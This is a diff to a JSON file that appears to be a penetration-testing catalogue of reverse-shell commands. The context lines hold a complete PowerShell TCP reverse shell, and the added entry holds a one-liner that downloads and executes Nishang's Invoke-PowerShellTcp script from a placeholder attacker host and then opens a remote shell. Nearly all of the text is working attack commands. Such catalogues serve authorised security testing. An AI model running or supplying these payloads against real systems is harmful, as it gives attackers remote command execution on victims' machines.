@@ -70,6 +70,10 @@
     {
       "label": "Windows PowerShell",
       "command": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('<lhost>',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()\""
+    },
+    {
+      "label": "Windows Nishang Invoke-PowerShellTcp (download + exec)",
+      "command": "powershell -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://<lhost>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <lhost> -Port <lport>\""
     }
   ],
   "opsec": "loud",
